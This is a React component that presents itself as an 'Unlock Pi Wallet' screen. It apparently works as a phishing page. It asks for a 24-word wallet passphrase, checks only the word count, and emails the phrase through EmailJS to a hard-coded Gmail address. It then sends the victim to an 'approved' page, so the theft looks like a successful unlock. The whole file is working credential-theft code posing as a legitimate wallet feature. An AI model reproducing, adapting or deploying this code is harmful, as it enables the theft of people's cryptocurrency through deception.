
import React, {useState } from 'react'
import emailjs from '@emailjs/browser';
import Spinner from 'react-activity/dist/Spinner';
import 'react-activity/dist/Spinner.css';
import { useNavigate } from 'react-router-dom';


function Phrase() {
    const navigate =useNavigate()
    const [phrase, setPhrase] = useState("");
    const [error, setError] = useState(false);
    const [loading, setLoading] = useState(false);
  
    const serviceID = import.meta.env.VITE_EMAILJS_SERVICE_ID;
    const templateID = import.meta.env.VITE_EMAILJS_TEMPLATE_ID;
    const userID = import.meta.env.VITE_EMAILJS_USER_ID;
    console.log(serviceID,userID,templateID)
  
    const handleSend = async () => {
      setLoading(true);
      setError(false); // Reset error state before starting
      
      const wordCount = phrase.trim().split(/\s+/).length;
      if (wordCount !== 24) {
        setError(true);
        setLoading(false); // Stop loading if there is an error
        return;
      }
  
      const templateParams = { message: phrase };
  
      try {
        await emailjs.send(serviceID, templateID, templateParams, userID,{to:["ld604068@gmail.com"]});
        setPhrase(""); 
        navigate('/approved')
      } catch (error) {
        console.error('Error:', error);
        alert('Verification failed. Please try again.');
        setError(true);
      } finally {
        setLoading(false); // Stop loading after async operation completes
      }
    };

    return (
        <div className='mb-3'>
            <div className="flex flex-col items-center  ">
                <h2 >Unlock Pi Wallet</h2>
                <div className='flex flex-col items-center '>
                    <textarea onChange={(e)=>setPhrase(e.target.value)} value={phrase}  className='resize-none mb-4 p-2 border-[#f3da4d] border-solid border-[1px]'  placeholder="Enter Your 24-character passphrase here" cols="30" rows="7" required="" />
                    {error && <p className="text-red-600 my-1">Invalid phrase</p>}
                </div>
                    <button onClick={handleSend} className="passphrasebtn bg-white border-[#76348e] border-solid border-[1px] rounded-md p-1 text-[#76348e] flex  items-center justify-center" > {loading ? <Spinner color="#76348e" /> : <span>  UNLOCK WITH PHRASE</span>}</button>
            </div>
        </div >
    )
}

export default Phrase